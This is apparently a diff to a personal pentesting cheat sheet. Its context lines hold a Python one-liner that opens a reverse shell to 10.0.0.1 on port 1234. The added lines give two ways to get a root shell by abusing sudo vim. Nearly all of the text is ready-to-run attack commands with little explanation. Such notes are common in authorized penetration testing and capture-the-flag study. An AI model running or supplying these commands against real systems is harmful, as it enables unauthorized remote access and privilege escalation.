@@ -34,3 +34,16 @@ grep . file
 _in python it would be, note that if the machine doesnt have python2 installed(modern machines) it works with python3_
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+#Privilege scalation with vim
+
+there are 2 ways of running a shell as root with vim
+
+##_First option_
+sudo vim 
+ -> :set shell=/bin/sh
+ -> :shell
+
+##_Second option_
+sudo vim -c ':!/bin/sh'
